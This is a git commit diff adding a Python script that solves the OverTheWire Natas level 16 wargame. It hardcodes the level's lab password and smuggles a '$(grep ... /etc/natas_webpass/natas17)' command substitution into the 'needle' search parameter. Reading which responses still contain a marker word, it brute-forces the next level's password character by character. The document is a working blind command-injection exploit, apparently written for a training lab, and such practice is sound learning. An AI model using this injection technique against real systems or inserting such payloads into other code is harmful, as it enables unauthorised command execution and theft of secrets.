238cc65686a49bdc1eb50b63c8292c45d00ea522
JeanBobNinja <mathieu.menuet@live.fr>
2019-03-31 19:39:54 +0200

    natas16: completed

--- natas16.py
+++ natas16.py
@@ -1,4 +1,6 @@
 import requests
+import string
+import re
 
 username = 'natas16'
 password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
@@ -6,4 +8,31 @@ password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
 url = "http://%s.natas.labs.overthewire.org" % username
 s = requests.Session()
 r = s.get(url, auth = (username,password))
-print(r.text)
+
+#chocolates$(grep A /etc/natas_webpass/natas17)
+
+alphabet = string.ascii_letters + string.digits
+
+discovered_username = ""
+
+def injection(res, usr, idx):
+    for char in alphabet:
+        tmp_usr = usr + char
+        _ended = True
+        payload = {
+            "needle": f'chocolates$(grep ^{tmp_usr} /etc/natas_webpass/natas17)'
+        }
+        r = s.get(url, params=payload, auth=(username, password))
+        if not re.search("chocolates", r.text):
+            _ended = False
+            print(f"[+] Current : {tmp_usr}")
+            injection(res, tmp_usr, idx + 1)
+            if idx != 1:
+                break
+    if _ended and usr != '':
+        print(f"[+] Found! : {usr}")
+        res.append(usr)
+
+usernames = []
+injection(usernames, "", 1)
+print(usernames)
